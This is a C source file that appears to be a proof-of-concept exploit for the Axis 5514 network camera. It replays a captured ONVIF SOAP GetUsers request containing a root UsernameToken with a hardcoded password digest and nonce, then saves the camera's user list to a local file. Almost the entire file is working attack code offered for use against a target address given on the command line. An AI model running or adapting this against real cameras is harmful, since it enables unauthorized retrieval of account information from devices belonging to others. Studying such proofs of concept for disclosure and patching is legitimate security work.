/**************************************************************************
 *
 * This PoC shows the attacker can remotely get user information of Axis camera 5514 without permission.
    the PoC needs that ONVIF service start in Axis camera 5514
 * usage: axis_5514_getusers [camera_address]
          [axis_5514_getusers 192.168.1.188]  
 * parameters: [camera_address]  the ip address or domain name of camera axis 5514, for example "192.168.1.188"
 *
 * 
 **************************************************************************/

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>


#pragma comment(lib, "ws2_32.lib")  

#define HTTP_DEF_PORT     80  /* default port */
#define HTTP_BUF_SIZE   2048  /* size of buffer   */
#define HTTP_HOST_LEN    256  /* length of host name */


char *http_req_hdr_tmpl = "GET %s HTTP/1.1\r\n"
    "Accept: image/gif, image/jpeg, */*\r\nAccept-Language: zh-cn\r\n"
    "Accept-Encoding: gzip, deflate\r\nHost: %s:%d\r\n"
    "User-Agent: Liang's Browser <0.1>\r\nConnection: Keep-Alive\r\n\r\n";

/*the message below can be captured on line by wireshark*/
char *xml="<?xml version=\"1.0\" encoding=\"utf-8\"?>"
"<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tds=\"http://www.onvif.org/ver10/device/wsdl\" xmlns:tt=\"http://www.onvif.org/ver10/schema\">"
  "<s:Header xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\">"
    "<wsse:Security xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\" xmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">"
      "<wsse:UsernameToken>"
        "<wsse:Username>root</wsse:Username>"
		"<wsse:Password Type=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest\">XYpE5KbDO4MwnWd8TnKSztGLX9w=</wsse:Password>"
        "<wsse:Nonce>ji5lN4UZ8Zs99g2v71VgJA==</wsse:Nonce>"
        "<wsu:Created>2015-12-29T02:10:11Z</wsu:Created>"
      "</wsse:UsernameToken>"
    "</wsse:Security>"
  "</s:Header>"
  "<soap:Body>"
    "<tds:GetUsers />"
  "</soap:Body>"  
"</soap:Envelope>"; 

      
/**************************************************************************
 *
 * function: extract host name, port and filename from input command:
 *           [http://www.baidu.com:8080/index.html]
 *
 * parameters: [IN]  buf, string;
 *            [OUT] host, host name;
 *            [OUT] port, port number;
 *            [OUT] file_name, filename;
 *
 * return: void.
 *
 **************************************************************************/
void http_parse_request_url(const char *buf, char *host, 
                            unsigned short *port, char *file_name)
{
    int length = 0;
    char port_buf[8];
    char *buf_end = (char *)(buf + strlen(buf));
    char *begin, *host_end, *colon, *file;

    begin = const_cast<char*>(strstr(buf, "//"));
    begin = (begin ? begin + 2 : const_cast<char*>(buf));
    
    colon = strchr(begin, ':');
    host_end = strchr(begin, '/');

    if (host_end == NULL)
    {
        host_end = buf_end;
    }
    else
    {   
        file = strrchr(host_end, '/');
        if (file && (file + 1) != buf_end)
            strcpy(file_name, file + 1);
    }
    if (colon) 
    {
        colon++;
        length = host_end - colon;
        memcpy(port_buf, colon, length);
        port_buf[length] = 0;
        *port = atoi(port_buf);
        host_end = colon - 1;
    }

    /* get host name */
    length = host_end - begin;
    memcpy(host, begin, length);
    host[length] = 0;/*end of buffer*/
}

int main(int argc, char* argv[])
{

    WSADATA wsa_data;
    SOCKET  http_sock = 0;         /* socket handle */
    struct sockaddr_in serv_addr;  /* server address */
    struct hostent *host_ent;    
    int result = 0, send_len,url_len;
	char url_buf[100];
    char data_buf[HTTP_BUF_SIZE];
    char host[HTTP_HOST_LEN] = "127.0.0.1";
    unsigned short port = HTTP_DEF_PORT;
    unsigned long addr;
    char file_name[HTTP_HOST_LEN] = "index.html";
	char file_nameforsave[HTTP_HOST_LEN] = "response.txt";//
    FILE *file_web;
	FILE *file_xml;
	char *url="";
	
    if (argc == 1)
    {
		url="http://192.168.1.XX/onvif/device_service";  //my camera url in test
    }else{
		url_len = sprintf(url_buf, "http://%s/onvif/device_service",argv[1]);  //the service address for camera management
		url_buf[url_len]=0;
		url=url_buf;
	}

    http_parse_request_url(url, host, &port, file_name);
    WSAStartup(MAKEWORD(2,0), &wsa_data); /* initialize WinSock */

    addr = inet_addr(host);
    if (addr == INADDR_NONE)
    {
        host_ent = gethostbyname(host);
        if (!host_ent)
        {
            printf("[Web] invalid host\n");
            return -1;
        }        
        memcpy(&addr, host_ent->h_addr_list[0], host_ent->h_length);
    }

    /* setting Camera address */
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr.s_addr = addr;

    http_sock = socket(AF_INET, SOCK_STREAM, 0); /* create socket */
    result = connect(http_sock, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if (result == SOCKET_ERROR) /* fail */
    {
        closesocket(http_sock);
        printf("[Web] fail to connect, error = %d\n", WSAGetLastError());
        return -1; 
    }else
		printf("connect successfully!!\n\n");

	send_len = sprintf(data_buf, 
			"POST /onvif/device_service HTTP/1.1\r\n"
			"Content-type: text/xml\r\n"
			"User-Agent: Python Post\r\n"
			"SOAPAction:\"http://%s/onvif/device_service\"\r\n"
			"Host: %s\r\n"
			"Content-Length: %d\r\n"
			"\r\n"
			"%s",host,host,strlen(xml),xml);
	data_buf[send_len]=0;
	printf("len=%d,buf=%s\n",send_len,data_buf);
    result = send(http_sock, data_buf, send_len, 0);

    if (result == SOCKET_ERROR) /* fail */
    {
        printf("[Web] fail to send, error = %d\n", WSAGetLastError());
        return -1; 
    }

    file_web = fopen(file_nameforsave, "w+");    
	
    do // receive response and save it in a file
    {
        result = recv(http_sock, data_buf, HTTP_BUF_SIZE, 0);
        if (result > 0)
        {
            fwrite(data_buf, 1, result, file_web);
            // print on screen 
            data_buf[result] = 0;
            printf("%s", data_buf);
        }
    } while(result>0);	
		printf("\n");
	
    return 0;
}